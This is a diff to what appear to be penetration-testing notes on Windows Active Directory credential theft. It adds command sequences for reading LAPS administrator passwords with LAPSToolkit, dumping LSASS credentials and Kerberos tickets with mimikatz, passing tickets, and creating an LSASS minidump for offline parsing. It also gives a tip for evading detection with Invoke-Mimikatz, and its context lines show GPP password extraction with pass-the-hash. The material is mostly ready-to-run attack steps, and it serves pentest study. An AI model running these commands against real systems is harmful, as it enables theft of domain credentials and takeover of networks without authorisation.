@@ -47,3 +47,54 @@ Get-GPPPassword.py 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'
 # pass-the-hash
 Get-GPPPassword.py -hashes 'LMhash':'NThash' 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'
 ```
+
+**LAPS(Local Administtrator Password Solution):**
+
+LAPS offered a secure and scalable way of remotely managing the local administrator password for domain-joined computers.
+
+Dumping it using a powershell script [LAPSToolKit](https://github.com/leoloobeek/LAPSToolkit):
+
+```
+PS C:\> Import-Module .\LAPSToolkit.ps1
+
+PS C:\> Get-LAPSComputers  -> to list all computers that are set up with LAPS
+
+PS C:\> Find-LAPSDelegatedGroups  -> list groups that can read LAPS
+
+PS C:\> Get-LAPSComputers  -> if we are logged in as a user that can read LAPS, it will retrun us with a cleartext password for the "Administrator" account of a computer.
+```
+(All this information can be retrieved using SharpHound and viewed with BloodHound)
+
+**LSASS(Local Security Authority Subsytem Service):**
+
+Since Microsoft’s implementation of Kerberos makes use of single sign-on, password hashes must be stored somewhere in order to renew a TGT request. In current versions of Windows, these hashes are stored in the Local Security Authority Subsystem Service (LSASS) memory space.
+
+However, since LSASS runs as SYSTEM, we need admin privileiges in order to access its memory space.
+
+1st method(using mimikatz, the commands here are meant to be thrown froma mimikatz shell):
+
+```
+To dump credentials:
+1. privilege::debug
+2. sekurlsa::logonpasswords
+
+To dump TGT and TGS:
+1. sekurlsa::tickets
+2. sekurlsa::tickets /export
+3. kerberos::ptt ticket.kirbi
+```
+(If you want to be stealthier, you can use [Invoke-Mimikatz](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1)).
+
+2nd method(using [MiniDump.cs](https://github.com/trike33/PEN-300-Code-Snippets/blob/main/Windows%20Credentials/MiniDump.cs)):
+
+Using this method we will create a dump file, which is a snapshot of a given process.
+
+```
+C:\minidump.exe c:\windows\tasks\lsass.dmp
+```
+(Then you can parse this dump file with mimikatz from a computer with matching OS and architecture, as the computer where the dump file was created)
+
+```
+#From a mimikatz shell(note that this doesn't require debug privileges)
+1. sekurlsa::minidump lsass.dmp
+2. sekurlsa::logonpasswords
